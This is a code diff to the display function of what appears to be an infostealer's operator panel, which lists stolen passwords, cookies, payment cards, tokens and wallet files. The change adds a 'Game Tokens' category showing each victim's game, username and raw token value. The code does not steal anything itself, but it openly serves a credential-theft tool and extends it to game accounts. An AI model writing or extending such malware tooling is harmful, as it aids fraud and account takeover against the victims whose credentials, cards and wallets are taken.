@@ -498,20 +498,22 @@ function handleStealResult(msg) {
   if (!stealResult) return;
   stealResult.classList.remove("hidden");
 
-  const creds   = msg.credentials || [];
-  const cookies = msg.cookies     || [];
-  const cards   = msg.cards       || [];
-  const tokens  = msg.tokens      || [];
-  const wallets = msg.wallets     || [];
-  const errors  = msg.errors      || [];
+  const creds      = msg.credentials || [];
+  const cookies    = msg.cookies     || [];
+  const cards      = msg.cards       || [];
+  const tokens     = msg.tokens      || [];
+  const wallets    = msg.wallets     || [];
+  const gameTokens = msg.gameTokens  || [];
+  const errors     = msg.errors      || [];
 
   if (stealSummary) {
     const parts = [];
-    if (creds.length)   parts.push(`${creds.length} password${creds.length !== 1 ? "s" : ""}`);
-    if (cookies.length) parts.push(`${cookies.length} cookie${cookies.length !== 1 ? "s" : ""}`);
-    if (cards.length)   parts.push(`${cards.length} card${cards.length !== 1 ? "s" : ""}`);
-    if (tokens.length)  parts.push(`${tokens.length} token${tokens.length !== 1 ? "s" : ""}`);
-    if (wallets.length) parts.push(`${wallets.length} wallet file${wallets.length !== 1 ? "s" : ""}`);
+    if (creds.length)      parts.push(`${creds.length} password${creds.length !== 1 ? "s" : ""}`);
+    if (cookies.length)    parts.push(`${cookies.length} cookie${cookies.length !== 1 ? "s" : ""}`);
+    if (cards.length)      parts.push(`${cards.length} card${cards.length !== 1 ? "s" : ""}`);
+    if (tokens.length)     parts.push(`${tokens.length} token${tokens.length !== 1 ? "s" : ""}`);
+    if (wallets.length)    parts.push(`${wallets.length} wallet file${wallets.length !== 1 ? "s" : ""}`);
+    if (gameTokens.length) parts.push(`${gameTokens.length} game token${gameTokens.length !== 1 ? "s" : ""}`);
     stealSummary.textContent = (parts.join(", ") || "Nothing found") +
       (errors.length ? ` — ${errors.length} error${errors.length !== 1 ? "s" : ""}` : "");
   }
@@ -581,6 +583,20 @@ function handleStealResult(msg) {
         `<span class="text-orange-400">${escapeHtml(w.wallet)}</span>` +
         ` <span class="text-slate-300">${escapeHtml(w.filename)}</span>` +
         ` <span class="text-slate-500 text-xs">${w.dataB64?.length ?? 0} b64 chars</span>` +
+        `</div>`
+      );
+    }
+  }
+
+  if (gameTokens.length) {
+    lines.push(`<div class="text-xs font-semibold text-emerald-400 mt-2 mb-0.5">Game Tokens</div>`);
+    for (const g of gameTokens) {
+      lines.push(
+        `<div class="py-0.5 border-b border-slate-700/40">` +
+        `<span class="text-emerald-400">${escapeHtml(g.game)}</span>` +
+        ` <span class="text-slate-500 text-xs">${escapeHtml(g.type)}</span>` +
+        (g.username ? ` <span class="text-cyan-300">${escapeHtml(g.username)}</span>` : "") +
+        ` <span class="text-slate-300 break-all">${escapeHtml(g.value)}</span>` +
         `</div>`
       );
     }
